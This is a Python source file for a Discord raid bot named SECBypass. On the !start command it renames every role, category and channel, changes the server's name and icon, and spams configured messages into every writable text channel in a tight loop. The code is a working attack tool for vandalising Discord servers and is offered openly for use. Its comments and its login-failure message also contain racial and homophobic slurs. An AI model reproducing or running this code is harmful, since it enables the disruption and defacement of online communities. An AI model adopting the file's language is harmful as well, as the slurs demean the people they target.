## yall niggas lucky im only doing open source shit

## https://github.com/7vntii
## https://github.com/7vntii
## https://github.com/7vntii
## https://github.com/7vntii

## skidding is gay

import os
import datetime
import json
import aiohttp
import asyncio
import discord
import importlib.util
import subprocess
from discord.ext import commands

os.system("")

def is_installed(package):
    return importlib.util.find_spec(package) is not None

if not is_installed("aiohttp"):
    subprocess.run(["pip", "install", "aiohttp"])

if not is_installed("discord"):
    subprocess.run(["pip", "install", "discord.py"])

os.system("cls")
os.system("title SECBypass - github.com/7vntii")

PURPLE = "\033[35m"
RESET = "\033[0m"

date_str = datetime.datetime.now().strftime("%m-%d-%Y")
prompt = f"{PURPLE}[{RESET}{date_str}{PURPLE}]{RESET} {PURPLE}[{RESET} > {PURPLE}]{RESET} Enter your bot token: "
token = input(prompt).strip()

with open("config.json", "r", encoding="utf-8") as f:
    config = json.load(f)

attack_running = False
spam_task = None

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", help_command=None, intents=intents)


@bot.command(name="help")
async def help_command(ctx):
    await ctx.message.delete()
    help_text = (
        "```this bot was made by 7```"
        "`!start` - Starts the attack\n"
        "`!stop` - Stops the attack\n"
        "https://github.com/7vntii | https://www.youtube.com/@7vntii"
    )
    await ctx.send(help_text)

async def apply_config(guild: discord.Guild):
    tasks = []

    for role in guild.roles:
        if role.name != "@everyone":
            tasks.append(role.edit(name=config["role_name"][0], reason="SECBypass"))
    for category in guild.categories:
        tasks.append(category.edit(name=config["channel_name"], reason="SECBypass"))
    for channel in guild.channels:
        tasks.append(channel.edit(name=config["channel_name"], reason="SECBypass"))

    if config["server_pfp"].lower() != "optional-link":
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(config["server_pfp"]) as resp:
                    if resp.status == 200:
                        icon_bytes = await resp.read()
                        tasks.append(guild.edit(icon=icon_bytes, reason="SECBypass"))
        except:
            pass

    tasks.append(guild.edit(name=config["server_name"], reason="SECBypass"))
    await asyncio.gather(*[t for t in tasks if t], return_exceptions=True)

async def spam_loop():
    global attack_running
    msg1 = "\n".join(config["message1"])
    msg2 = "\n".join(config["message2"])
    combined_messages = [msg1, msg2]

    while attack_running:
        tasks = []
        for guild in bot.guilds:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    for msg in combined_messages:
                        tasks.append(channel.send(msg))
        if tasks:
            await asyncio.gather(*[asyncio.create_task(t) for t in tasks], return_exceptions=True)
        await asyncio.sleep(0.1)


@bot.command(name="start")
async def start_command(ctx):
    await ctx.message.delete()
    global attack_running, spam_task

    if attack_running:
        await ctx.send("```already running dummy```")
        return

    attack_running = True
    await apply_config(ctx.guild)
    spam_task = asyncio.create_task(spam_loop())


@bot.command(name="stop")
async def stop_command(ctx):
    await ctx.message.delete()
    global attack_running, spam_task
    if not attack_running:
        await ctx.send("```nothings running dummy```")
        return

    attack_running = False
    if spam_task:
        spam_task.cancel()
        spam_task = None
    await ctx.send("```stopped succesfully```")


try:
    bot.run(token)
except discord.LoginFailure:
    print("Invalid bot token nigger!")